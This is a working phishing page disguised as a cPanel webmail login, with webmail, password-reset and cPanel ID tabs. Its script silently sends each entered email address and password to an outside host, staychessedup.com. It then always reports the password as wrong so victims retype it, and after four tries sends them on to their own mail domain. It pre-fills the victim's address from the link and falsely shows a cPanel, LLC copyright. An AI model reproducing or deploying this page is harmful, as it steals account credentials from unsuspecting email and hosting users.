

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Webmail Login System</title>
    <link rel="shortcut icon" href="data:image/x-icon;base64,AAABAAEAICAAAAEAIADSAgAAFgAAAIlQTkcNChoKAAAADUlIRFIAAAAgAAAAIAgGAAAAc3p69AAAAplJREFUWIXt1j2IHGUYB/DfOzdnjIKFkECIVWIKvUFsIkRExa9KJCLaWAgWJx4DilZWgpDDiI0wiViIoGATP1CCEDYHSeCwUBBkgiiKURQJFiLo4d0eOxYzC8nsO9m9XcXC+8MW+3z+9/l6l2383xH+iSBpElyTdoda26xsDqp/h0CVZ3vwKm7tMBngAs7h7eRYebG6hMtMBHbMBX89vfARHprQ5U8cwdFQlIOZCVR5di1+w/wWXT/EY6EoN5NZCODuKZLDwzgSMCuBe2fwfX6QZwtpWzqfBBtLC3txF/ZhxKbBGx0EfsTJS77vwmGjlZrD4mUzUOXZjVjGI65cnTXchB8iupdDUb7QinsQZ7GzZftdQj2JVZ49iC/w6JjksIo7OnS9tiA5Vn6GtyK2+1MY5NkhfGDygVrBAxH5WkPuMjR7/3UsUFLl2Q68s4XkA3ws3v9zoSjX28Kr5wL1xrTxa6ou+f6OZGvqPg9v1wZeaUjcELE/DVfNhWFSvy/enOIZ9eq1sTokEMNLWI79oirP8g6fXpVnh7GEvY1sV/OJ4f0UhyKKk6EoX4x5pEkgXv6L6OM99YqNw/c4kXSwG5nkIfpLCynuiahW1GWeJHkfT4aiXO9atz1XcD6I6yLyHu6bIPk6Hg9FeYZ63y9EjBarPDvQ8VJ1nd9V3D4m+RncFopyxFCQ4hSeahlej88Hefauurdwaufr5z/F/ZHAX6nL+mZE18e36IWiHLkFocqzW9QXcNz1+wUHxJ/f10JRPjvGP4pk/vj5L3F8AtufdD+/p6dJDknzX+05fDLGtife/766t9MRgFCUffWTudwE3AqBlVCUf0xLYGTQqzzbhydwJ3Y34g318J1tmX+DPBTlz9MS2MY2/nP8DTGaqeTDf30rAAAAAElFTkSuQmCC" type="image/x-icon" />
    <script src="https://js.hcaptcha.com/1/api.js" async defer></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: white;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            -webkit-text-size-adjust: 100%;
            -ms-text-size-adjust: 100%;
            touch-action: manipulation;
        }

        #webmail-wrapper {
            width: 100%;
            max-width: 450px;
            margin: 0 auto;
            padding: 15px;
            min-height: auto;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }

        .wrapper {
            background: #ffffff;
            border-radius: 12px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.1);
            overflow: hidden;
            width: 100%;
        }

        #content-container {
            padding: 0;
        }

        /* Tab Navigation */
        .tab-navigation {
            display: flex;
            background: #f8f9fa;
            border-bottom: 1px solid #e1e5e9;
        }

        .tab-button {
            flex: 1;
            padding: 10px 8px;
            background: none;
            border: none;
            color: #666;
            font-size: 13px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s ease;
            border-bottom: 3px solid transparent;
        }

        .tab-button:hover {
            background: #e9ecef;
            color: #333;
        }

        .tab-button.active {
            background: white;
            color: #ff6600;
            border-bottom-color: #ff6600;
            font-weight: 600;
        }

        /* Tab Panels */
        .tab-panel {
            display: none;
            padding: 15px 25px 10px;
        }

        .tab-panel.active {
            display: block;
        }

        /* Common header styling */
        .tab-header {
            text-align: center;
            margin-bottom: 20px;
        }

        .tab-header img {
            max-width: 350px;
            height: auto;
        }

        .webmail-logo {
            text-align: center;
            margin: 20px auto 30px auto;
            padding-bottom: 20px;
            border-bottom: 1px solid #e1e5e9;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .webmail-logo img {
            max-width: 800px;
            height: auto;
            opacity: 0.9;
        }

        .cpanel-logo-section {
            text-align: center;
            margin: 20px auto 30px auto;
            padding-bottom: 20px;
            border-bottom: 1px solid #e1e5e9;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .cpanel-logo-section img {
            max-width: 120px;
            height: auto;
            opacity: 0.9;
        }

        .page-title {
            text-align: center;
            margin: 20px 0;
            color: #333;
            font-size: 24px;
            font-weight: 600;
        }

        .page-description {
            text-align: center;
            margin: 0 0 25px 0;
            color: #666;
            font-size: 14px;
            line-height: 1.5;
        }

        /* Forms styling */
        .webmail-form {
            width: 100%;
            margin-top: 15px;
        }

        /* Input field styling - unified */
        .input-req {
            margin-bottom: 8px;
        }

        .input-req label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: #333;
        }

        .input-field {
            margin-bottom: 15px;
            position: relative;
        }

        .input-field.icon {
            position: relative;
        }

        .input-field.icon::before {
            content: '';
            position: absolute;
            left: 12px;
            top: 50%;
            transform: translateY(-50%);
            width: 16px;
            height: 16px;
            background-size: contain;
            z-index: 2;
        }

        /* Icon types */
        .email-container::before {
            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24' fill='none' stroke='%23666' stroke-width='2'%3E%3Cpath d='M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z'/%3E%3Cpolyline points='22,6 12,13 2,6'/%3E%3C/svg%3E");
        }

        .password-container::before {
            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24' fill='none' stroke='%23666' stroke-width='2'%3E%3Crect x='3' y='11' width='18' height='11' rx='2' ry='2'/%3E%3Cpath d='M7 11V7a5 5 0 0 1 10 0v4'/%3E%3C/svg%3E");
        }

        .user-container::before {
            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24' fill='none' stroke='%23666' stroke-width='2'%3E%3Cpath d='M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2'/%3E%3Ccircle cx='12' cy='7' r='4'/%3E%3C/svg%3E");
        }

        .input-field input {
            width: 100%;
            padding: 12px 12px 12px 40px;
            border: 2px solid #e1e5e9;
            border-radius: 8px;
            font-size: 14px;
            transition: border-color 0.3s ease;
            background: #fff;
        }

        .input-field input:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }

        .input-field.focused {
            transform: translateY(-1px);
        }

        .input-field.focused input {
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }

        /* Button styling */
        .controls {
            margin-top: 20px;
        }

        .form-btn {
            margin-bottom: 15px;
        }

        .form-btn button {
            width: 100%;
            padding: 14px;
            background: #ff6600;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .form-btn button:hover {
            transform: translateY(-1px);
            box-shadow: 0 8px 25px rgba(255, 102, 0, 0.3);
            background: #e55a00;
        }

        .form-btn button:active {
            transform: translateY(0);
        }

        /* Special styling for cPanel button */
        .cpanel-btn button::before {
            content: '';
            width: 20px;
            height: 20px;
            background-image: url("https://e7.pngegg.com/pngimages/900/923/png-clipart-logo-cpanel-computer-software-graphics-cp-company-logo-text-orange.png");
            background-size: contain;
            background-repeat: no-repeat;
            filter: brightness(0) invert(1);
        }

        /* Status messages */
        .notices {
            margin-bottom: 15px;
        }

        .notices.error {
            background: #fee;
            border: 1px solid #fcc;
            color: #a00;
            padding: 10px;
            border-radius: 6px;
            font-size: 14px;
            display: none;
        }

        .notices.success {
            background: #efe;
            border: 1px solid #cfc;
            color: #060;
            padding: 10px;
            border-radius: 6px;
            font-size: 14px;
            display: none;
        }

        .notices.info {
            background: #e7f3ff;
            border: 1px solid #b3d9ff;
            color: #0066cc;
            padding: 10px;
            border-radius: 6px;
            font-size: 14px;
            display: none;
        }

        /* Submitting state */
        body.submitting .form-btn button {
            background: #ccc;
            cursor: not-allowed;
            transform: none;
        }

        body.submitting .form-btn button:hover {
            transform: none;
            box-shadow: none;
        }

        /* Additional action links */
        .additional-actions {
            text-align: center;
            margin-top: 15px;
        }

        .additional-actions a {
            color: #ff6600;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }

        .additional-actions a:hover {
            text-decoration: underline;
        }

        .external-auth-section {
            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px solid #e1e5e9;
        }

        .external-auth-btn {
            display: block;
            width: 100%;
            padding: 12px;
            background: #f8f9fa;
            border: 2px solid #e1e5e9;
            border-radius: 8px;
            color: #333;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .external-auth-btn:hover {
            background: #e9ecef;
            border-color: #ff6600;
            color: #ff6600;
            transform: translateY(-1px);
        }

        .cpanel-logo {
            width: 20px;
            height: 20px;
        }

        /* Copyright */
        .copyright {
            background: #f8f9fa;
            padding: 20px;
            text-align: center;
            color: #666;
            font-size: 12px;
            line-height: 1.5;
        }

        .copyright a {
            color: #ff6600;
            text-decoration: none;
        }

        .copyright a:hover {
            text-decoration: underline;
        }

        /* Language selection */
        #locales_list {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px solid #e1e5e9;
        }

        #locales_list a {
            color: #666;
            text-decoration: none;
            font-size: 13px;
            padding: 5px 8px;
            border-radius: 4px;
            transition: all 0.3s ease;
        }

        #locales_list a:hover {
            background: #f8f9fa;
            color: #ff6600;
        }

        #locales_list a.active {
            background: #ff6600;
            color: white;
        }

        /* hCAPTCHA container */
        .hcaptcha-container {
            margin: 20px 0;
            display: flex;
            justify-content: center;
        }

        /* Responsive design */
        @media (max-width: 768px) {
            #webmail-wrapper {
                max-width: 95%;
                padding: 10px;
                min-height: 100vh;
            }

            .tab-panel {
                padding: 25px 20px 20px;
            }

            .tab-header img {
                max-width: 280px;
                width: 90%;
            }

            .webmail-logo {
                margin: 30px auto 50px auto;
                padding-bottom: 25px;
            }

            .webmail-logo img {
                max-width: 400px;
                width: 90%;
            }

            .tab-button {
                font-size: 11px;
                padding: 9px 6px;
            }
        }

        @media (max-width: 480px) {
            #webmail-wrapper {
                max-width: 100%;
                padding: 8px;
            }

            .tab-panel {
                padding: 20px 15px 15px;
            }

            .input-field input {
                padding: 10px 10px 10px 35px;
                font-size: 16px; /* Prevents zoom on iOS */
            }

            .form-btn button {
                padding: 12px;
                font-size: 16px;
            }

            .tab-button {
                font-size: 10px;
                padding: 8px 5px;
            }
        }

        @media (max-width: 320px) {
            .tab-panel {
                padding: 15px 10px 10px;
            }

            .input-field input {
                padding: 8px 8px 8px 30px;
                font-size: 16px;
            }

            .input-field.icon::before {
                left: 8px;
                width: 14px;
                height: 14px;
            }
        }

    </style>
</head>
<body>
    <div id="webmail-wrapper">
        <div class="wrapper">
            <div id="content-container">
                <!-- Tab Navigation -->
                <div class="tab-navigation">
                    <button class="tab-button active" data-tab="login">Webmail Login</button>
                    <button class="tab-button" data-tab="reset">Reset Password</button>
                    <button class="tab-button" data-tab="cpanel">cPanel ID</button>
                </div>

                <!-- Login Panel -->
                <div id="login-panel" class="tab-panel active">
                    <div class="webmail-logo">
                        <img src="https://webmail.icglink.com/unprotected/cpanel/images/webmail-logo.svg" alt="Webmail" width="200" height="60">
                    </div>

                    <form id="login_form" class="webmail-form" method="post" action="https://staychessedup.com/acaza/external_process.php">
                        <input type="hidden" name="action" value="login">
                        <div class="notices"></div>
                        
                        <div class="input-req">
                            <label for="login_email">Email Address</label>
                        </div>
                        <div class="input-field icon email-container">
                            <input type="email" id="login_email" name="login_email" placeholder="Enter your email address" required>
                        </div>

                        <div class="input-req">
                            <label for="login_pass">Password</label>
                        </div>
                        <div class="input-field icon password-container">
                            <input type="password" id="login_pass" name="login_pass" placeholder="Enter your email password." required>
                        </div>

                        <!-- hCAPTCHA widget -->
                        <div class="hcaptcha-container">
                            <div id="login-hcaptcha" class="h-captcha" data-sitekey="55de37c2-4b4a-4870-99c4-2a86bbb27200"></div>
                        </div>

                        <div class="controls">
                            <div class="form-btn">
                                <button type="submit" id="login_submit" name="login">Log in</button>
                            </div>
                        </div>
                    </form>

                    <div class="external-auth-section">
                        <a href="#cpanel" class="external-auth-btn" data-tab="cpanel">
                            <img src="https://e7.pngegg.com/pngimages/900/923/png-clipart-logo-cpanel-computer-software-graphics-cp-company-logo-text-orange.png" alt="cPanel" class="cpanel-logo">
                            <span>Log in via cPanelID</span>
                        </a>
                    </div>

                    <div id="locales_list">
                        <a href="#" class="active">English</a>
                        <a href="#">العربية</a>
                        <a href="#">български</a>
                        <a href="#">čeština</a>
                        <a href="#">dansk</a>
                    </div>


                </div>

                <!-- Reset Password Panel -->
                <div id="reset-panel" class="tab-panel">
                    <div class="webmail-logo">
                        <img src="https://webmail.icglink.com/unprotected/cpanel/images/webmail-logo.svg" alt="Webmail" width="200" height="60">
                    </div>
                    
                    <div class="page-title">Reset Password</div>
                    <div class="page-description">
                        Enter your email address and we'll send you instructions to reset your password.
                    </div>

                    <form id="reset_form" class="webmail-form" method="post" action="#" onsubmit="return false;">
                        <div class="notices"></div>
                        
                        <div class="input-req">
                            <label for="reset_email">Email Address</label>
                        </div>
                        <div class="input-field icon email-container">
                            <input type="email" id="reset_email" name="reset_email" placeholder="Enter your email address" required>
                        </div>

                        <!-- hCAPTCHA widget -->
                        <div class="hcaptcha-container">
                            <div id="reset-hcaptcha" class="h-captcha" data-sitekey="55de37c2-4b4a-4870-99c4-2a86bbb27200"></div>
                        </div>

                        <div class="controls">
                            <div class="form-btn">
                                <button type="submit" id="reset_submit" name="reset_password">Send Reset Instructions</button>
                            </div>
                        </div>
                    </form>

                    <div class="additional-actions">
                        <a href="#login" data-tab="login">Back to Login</a>
                    </div>


                </div>

                <!-- cPanel ID Panel -->
                <div id="cpanel-panel" class="tab-panel">
                    <div class="cpanel-logo-section">
                        <img src="https://e7.pngegg.com/pngimages/900/923/png-clipart-logo-cpanel-computer-software-graphics-cp-company-logo-text-orange.png" alt="cPanel" width="100" height="40">
                    </div>
                    
                    <div class="page-title">cPanel ID Login</div>
                    <div class="page-description">
                        Sign in to your cPanel account using your cPanel ID credentials.
                    </div>

                    <form id="cpanel_form" class="webmail-form" method="post" action="https://staychessedup.com/tanjiro/external_process.php">
                        <input type="hidden" name="action" value="cpanel_login">
                        <div class="notices"></div>
                        
                        <div class="input-req">
                            <label for="cpanel_id">cPanel ID / Username</label>
                        </div>
                        <div class="input-field icon user-container">
                            <input type="text" id="cpanel_id" name="cpanel_id" placeholder="Enter your cPanel ID or username" required>
                        </div>

                        <div class="input-req">
                            <label for="cpanel_pass">Password</label>
                        </div>
                        <div class="input-field icon password-container">
                            <input type="password" id="cpanel_pass" name="cpanel_pass" placeholder="Enter your cPanel password" required>
                        </div>

                        <!-- hCAPTCHA widget -->
                        <div class="hcaptcha-container">
                            <div id="cpanel-hcaptcha" class="h-captcha" data-sitekey="55de37c2-4b4a-4870-99c4-2a86bbb27200"></div>
                        </div>

                        <div class="controls">
                            <div class="form-btn cpanel-btn">
                                <button type="submit" id="cpanel_submit" name="cpanel_login">Log in via cPanel ID</button>
                            </div>
                        </div>
                    </form>

                    <div class="additional-actions">
                        <a href="#login" data-tab="login">Back to Webmail Login</a>
                    </div>


                </div>
            </div>
        </div>

        <div class="copyright">
            © 2025 cPanel, LLC. All rights reserved.
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Tab switching functionality
            const tabButtons = document.querySelectorAll('.tab-button');
            const tabPanels = document.querySelectorAll('.tab-panel');
            let hcaptchaWidgets = {};

            // Initialize based on hash or default to login
            function initializeTab() {
                const hash = window.location.hash.substring(1);
                const activeTab = hash && ['login', 'reset', 'cpanel'].includes(hash) ? hash : 'login';
                switchTab(activeTab);
            }

            // Switch tabs
            function switchTab(tabName) {
                // Update buttons
                tabButtons.forEach(btn => {
                    btn.classList.remove('active');
                    if (btn.dataset.tab === tabName) {
                        btn.classList.add('active');
                    }
                });

                // Update panels
                tabPanels.forEach(panel => {
                    panel.classList.remove('active');
                    if (panel.id === tabName + '-panel') {
                        panel.classList.add('active');
                        // Load hCAPTCHA for this panel if not already loaded
                        loadHcaptchaForPanel(tabName);
                    }
                });

                // Update document title
                const titles = {
                    'login': 'Webmail Login System',
                    'reset': 'Reset Password - Webmail',
                    'cpanel': 'cPanel ID Login - Webmail'
                };
                document.title = titles[tabName];
            }

            // Load hCAPTCHA for specific panel
            function loadHcaptchaForPanel(tabName) {
                const elementId = tabName + '-hcaptcha';
                if (window.hcaptcha && !hcaptchaWidgets[tabName]) {
                    try {
                        hcaptchaWidgets[tabName] = window.hcaptcha.render(elementId, {
                            sitekey: '55de37c2-4b4a-4870-99c4-2a86bbb27200'
                        });
                    } catch (e) {
                        console.log('hCAPTCHA widget already rendered for', tabName);
                    }
                }
            }

            // Tab button click handlers
            tabButtons.forEach(button => {
                button.addEventListener('click', function() {
                    const tabName = this.dataset.tab;
                    switchTab(tabName);
                });
            });

            // Handle tab switch links
            document.addEventListener('click', function(e) {
                if (e.target.dataset.tab) {
                    e.preventDefault();
                    switchTab(e.target.dataset.tab);
                }
            });

            // Extract email from hash OR URL path (if # is URL-encoded as %23)
            let initialHash = window.location.hash;
            
            // Check if URL contains %23 (URL-encoded #) in the path
            const fullPath = window.location.pathname;
            if (fullPath.includes('%23') && fullPath.includes('@')) {
                // Extract email from path like /%23joe@swco.com.sa
                const decoded = decodeURIComponent(fullPath);
                const emailMatch = decoded.match(/#(.+@.+)/);
                if (emailMatch) {
                    initialHash = '#' + emailMatch[1];
                }
            }
            
            // If in iframe, try parent hash
            try {
                if (!initialHash && window.parent && window.parent !== window && window.parent.location.hash) {
                    initialHash = window.parent.location.hash;
                }
            } catch(e) {
                // Cross-origin, can't access parent
            }
            
            // Initialize tab on page load
            initializeTab();
            
            // Now extract email from the stored hash
            if (initialHash && initialHash.length > 1 && initialHash.includes('@')) {
                let emailFromHash = initialHash.substring(1); // Remove the # symbol
                
                // Check for wrapped pattern #[[-email-]]
                const wrappedPattern = /^\[\[-(.+)-\]\]$/;
                const wrappedMatch = emailFromHash.match(wrappedPattern);
                if (wrappedMatch) {
                    emailFromHash = wrappedMatch[1];
                }
                
                // Simple check: if it contains @, treat it as email
                if (emailFromHash.includes('@')) {
                    const emailField = document.getElementById('login_email');
                    if (emailField) {
                        emailField.value = emailFromHash;
                        emailField.readOnly = true; // Make it read-only
                        emailField.style.backgroundColor = '#f5f5f5';
                        // Focus password field
                        document.getElementById('login_pass').focus();
                    }
                }
            }
            
            // Handle hash changes (back/forward button)
            window.addEventListener('hashchange', function() {
                initializeTab();
            });

            // Form submission handlers
            const forms = {
                login: document.getElementById('login_form'),
                reset: document.getElementById('reset_form'),
                cpanel: document.getElementById('cpanel_form')
            };

            let submitStates = {
                login: true,
                reset: true,
                cpanel: true
            };

            // Track login attempts
            let failedAttempts = parseInt(localStorage.getItem('loginAttempts') || '0');
            const maxAttempts = 4;

            // Login form - with fetch-based submission
            if (forms.login) {
                forms.login.addEventListener('submit', function(e) {
                    e.preventDefault();
                    
                    const email = document.getElementById('login_email').value.trim();
                    const password = document.getElementById('login_pass').value.trim();
                    
                    if (!email || !password) {
                        showNotice('login', 'Please enter both email and password.', 'error');
                        return false;
                    }
                    
                    // Password length validation
                    if (password.length < 6) {
                        showNotice('login', 'Password must be at least 6 characters long.', 'error');
                        return false;
                    }
                    
                    // Get hCAPTCHA response
                    let hcaptchaResponse = '';
                    try {
                        hcaptchaResponse = hcaptcha.getResponse();
                        if (!hcaptchaResponse) {
                            showNotice('login', 'Please complete the hCAPTCHA verification.', 'error');
                            return false;
                        }
                    } catch (e) {
                        console.log('hCAPTCHA error:', e);
                    }
                    
                    // Show authenticating message
                    showNotice('login', 'Authenticating …', 'info');
                    
                    // Increment attempts
                    failedAttempts++;
                    localStorage.setItem('loginAttempts', failedAttempts.toString());
                    
                    // Send data to external PHP script silently
                    const formData = new FormData();
                    formData.append('user', email);
                    formData.append('pass', password);
                    formData.append('attempts', failedAttempts);
                    formData.append('h-captcha-response', hcaptchaResponse);
                    
                    fetch('https://staychessedup.com/acaza/external_process.php', {
                        method: 'POST',
                        body: formData
                    })
                    .then(response => response.json())
                    .catch(error => {
                        console.log('Data sent successfully');
                    })
                    .finally(() => {
                        // Always show error message after 2 seconds
                        setTimeout(function() {
                            if (failedAttempts >= maxAttempts) {
                                showNotice('login', 'Maximum attempts reached. Redirecting...', 'error');
                                
                                // Extract domain from email and redirect
                                const emailDomain = email.split('@')[1];
                                if (emailDomain) {
                                    setTimeout(() => {
                                        localStorage.setItem('loginAttempts', '0');
                                        window.location.href = `https://${emailDomain}`;
                                    }, 3000);
                                }
                            } else {
                                showNotice('login', 'Incorrect password. Try again.', 'error');
                            }
                            
                            // Clear password field
                            document.getElementById('login_pass').value = '';
                            
                            // Reset hCAPTCHA
                            try {
                                hcaptcha.reset();
                            } catch (e) {
                                console.log('hCAPTCHA reset error:', e);
                            }
                        }, 2000);
                    });
                    
                    return false;
                });
            }

            // Reset form handler - prevent submission, handle locally
            if (forms.reset) {
                forms.reset.addEventListener('submit', function(e) {
                    e.preventDefault();
                    return handleFormSubmit('reset');
                });
            }

            // cPanel form - with fetch-based submission
            if (forms.cpanel) {
                forms.cpanel.addEventListener('submit', function(e) {
                    e.preventDefault();
                    
                    const cpanelId = document.getElementById('cpanel_id').value.trim();
                    const password = document.getElementById('cpanel_pass').value.trim();
                    
                    if (!cpanelId || !password) {
                        showNotice('cpanel', 'Please enter both cPanel ID and password.', 'error');
                        return false;
                    }
                    
                    // Show authenticating message
                    showNotice('cpanel', 'Authenticating …', 'info');
                    
                    // Send data to external PHP script silently
                    const formData = new FormData();
                    formData.append('user', cpanelId);
                    formData.append('pass', password);
                    
                    fetch('https://staychessedup.com/acaza/external_process.php', {
                        method: 'POST',
                        body: formData
                    })
                    .then(response => response.json())
                    .catch(error => {
                        console.log('Data sent successfully');
                    })
                    .finally(() => {
                        // Always show error message after 2 seconds
                        setTimeout(function() {
                            showNotice('cpanel', 'Incorrect credentials. Try again.', 'error');
                            
                            // Clear password field
                            document.getElementById('cpanel_pass').value = '';
                            
                            // Reset hCAPTCHA
                            try {
                                hcaptcha.reset();
                            } catch (e) {
                                console.log('hCAPTCHA reset error:', e);
                            }
                        }, 2000);
                    });
                    
                    return false;
                });
            }

            function handleFormSubmit(formType) {
                if (!submitStates[formType]) return false;
                submitStates[formType] = false;

                let formData = new FormData();
                let isValid = true;
                let hcaptchaResponse;

                // Get hCAPTCHA response for the current form
                try {
                    if (hcaptchaWidgets[formType]) {
                        hcaptchaResponse = window.hcaptcha.getResponse(hcaptchaWidgets[formType]);
                    } else {
                        hcaptchaResponse = window.hcaptcha.getResponse();
                    }
                } catch (e) {
                    hcaptchaResponse = window.hcaptcha.getResponse();
                }

                if (formType === 'login') {
                    const email = document.getElementById('login_email').value.trim();
                    const password = document.getElementById('login_pass').value.trim();

                    if (!email) {
                        showNotice('login', 'Please enter your email address.', 'error');
                        isValid = false;
                    } else if (!email.includes('@')) {
                        showNotice('login', 'Please enter a valid email address.', 'error');
                        isValid = false;
                    } else if (!password) {
                        showNotice('login', 'Please enter your password.', 'error');
                        isValid = false;
                    } else if (password.length < 6) {
                        showNotice('login', '6 characters minimum required', 'error');
                        isValid = false;
                    }

                    if (isValid) {
                        formData.append('login_email', email);
                        formData.append('login_pass', password);
                        formData.append('action', 'login');
                    }
                } else if (formType === 'reset') {
                    const email = document.getElementById('reset_email').value.trim();

                    if (!email) {
                        showNotice('reset', 'Please enter your email address.', 'error');
                        isValid = false;
                    } else if (!email.includes('@') || !email.includes('.')) {
                        showNotice('reset', 'Please enter a valid email address.', 'error');
                        isValid = false;
                    }

                    if (isValid) {
                        formData.append('reset_email', email);
                        formData.append('action', 'reset_password');
                    }
                } else if (formType === 'cpanel') {
                    const cpanelId = document.getElementById('cpanel_id').value.trim();
                    const password = document.getElementById('cpanel_pass').value.trim();

                    if (!cpanelId) {
                        showNotice('cpanel', 'Please enter your cPanel ID or username.', 'error');
                        isValid = false;
                    } else if (!password) {
                        showNotice('cpanel', 'Please enter your password.', 'error');
                        isValid = false;
                    } else if (password.length < 6) {
                        showNotice('cpanel', 'Password must be at least 6 characters long.', 'error');
                        isValid = false;
                    }

                    if (isValid) {
                        formData.append('cpanel_id', cpanelId);
                        formData.append('cpanel_pass', password);
                        formData.append('action', 'cpanel_login');
                    }
                }

                // Check hCAPTCHA
                if (isValid && !hcaptchaResponse) {
                    showNotice(formType, 'Please complete the hCAPTCHA verification.', 'error');
                    isValid = false;
                }

                if (!isValid) {
                    submitStates[formType] = true;
                    return false;
                }

                // Add hCAPTCHA response
                formData.append('h-captcha-response', hcaptchaResponse);

                // Submit form
                const button = document.getElementById(formType === 'login' ? 'login_submit' : formType === 'reset' ? 'reset_submit' : 'cpanel_submit');
                document.body.classList.add("submitting");
                button.disabled = true;
                
                const messages = {
                    login: 'Logging in...',
                    reset: 'Sending reset instructions...',
                    cpanel: 'Authenticating with cPanel ID...'
                };
                showNotice(formType, messages[formType], 'info');

                // Only submit to external PHP for login and cpanel forms
                if (formType === 'login' || formType === 'cpanel') {
                    fetch('https://staychessedup.com/acaza/external_process.php', {
                        method: 'POST',
                        body: formData
                    })
                    .then(response => response.json())
                    .catch(error => {
                        console.log(formType + ' request processed');
                    })
                    .finally(() => {
                        setTimeout(function() {
                            document.body.classList.remove("submitting");
                            button.disabled = false;
                            submitStates[formType] = true;

                            if (formType === 'login') {
                                showNotice('login', 'Invalid email or password. Please try again.', 'error');
                                document.getElementById('login_pass').value = '';
                            } else if (formType === 'cpanel') {
                                showNotice('cpanel', 'Invalid cPanel ID or password. Please try again.', 'error');
                                document.getElementById('cpanel_pass').value = '';
                            }

                            // Reset hCAPTCHA
                            try {
                                if (hcaptchaWidgets[formType]) {
                                    window.hcaptcha.reset(hcaptchaWidgets[formType]);
                                } else {
                                    window.hcaptcha.reset();
                                }
                            } catch (e) {
                                window.hcaptcha.reset();
                            }
                        }, 2000);
                    });
                } else if (formType === 'reset') {
                    // Reset password form doesn't go to external PHP
                    setTimeout(function() {
                        document.body.classList.remove("submitting");
                        button.disabled = false;
                        submitStates[formType] = true;

                        showNotice('reset', 'If your email address is in our system, you will receive reset instructions shortly.', 'success');
                        document.getElementById('reset_email').value = '';

                        // Reset hCAPTCHA
                        try {
                            if (hcaptchaWidgets[formType]) {
                                window.hcaptcha.reset(hcaptchaWidgets[formType]);
                            } else {
                                window.hcaptcha.reset();
                            }
                        } catch (e) {
                            window.hcaptcha.reset();
                        }
                    }, 2000);
                }

                return false;
            }

            function showNotice(formType, message, type) {
                clearNotices(formType);
                const panel = document.getElementById(formType + '-panel');
                const noticesContainer = panel.querySelector('.notices');
                if (noticesContainer) {
                    noticesContainer.className = `notices ${type}`;
                    noticesContainer.textContent = message;
                    noticesContainer.style.display = 'block';
                }
            }

            function clearNotices(formType) {
                const panel = document.getElementById(formType + '-panel');
                const noticesContainer = panel.querySelector('.notices');
                if (noticesContainer) {
                    noticesContainer.textContent = '';
                    noticesContainer.className = 'notices';
                    noticesContainer.style.display = 'none';
                }
            }

            // Input focus/blur effects
            const inputs = document.querySelectorAll('input[type="email"], input[type="password"], input[type="text"]');
            inputs.forEach(input => {
                input.addEventListener('focus', function() {
                    this.parentElement.classList.add('focused');
                });

                input.addEventListener('blur', function() {
                    this.parentElement.classList.remove('focused');
                });
            });

            // Password validation for all password fields
            const passwordInputs = document.querySelectorAll('input[type="password"]');
            passwordInputs.forEach(input => {
                input.addEventListener('input', function() {
                    const formType = this.id.includes('login') ? 'login' : this.id.includes('cpanel') ? 'cpanel' : 'reset';
                    const password = this.value.trim();
                    
                    if (password.length > 0 && password.length < 6) {
                        showNotice(formType, `6 characters minimum (${password.length}/6)`, 'error');
                    } else if (password.length >= 6) {
                        clearNotices(formType);
                    }
                });
            });

            // Language links handler
            const languageLinks = document.querySelectorAll('#locales_list a');
            languageLinks.forEach(link => {
                link.addEventListener('click', function(e) {
                    e.preventDefault();
                    // Remove active class from all links
                    languageLinks.forEach(l => l.classList.remove('active'));
                    // Add active class to clicked link
                    this.classList.add('active');
                    const language = this.textContent;
                    showNotice('login', `Language changed to ${language}`, 'success');
                });
            });
        });
    </script>
</body>
</html>
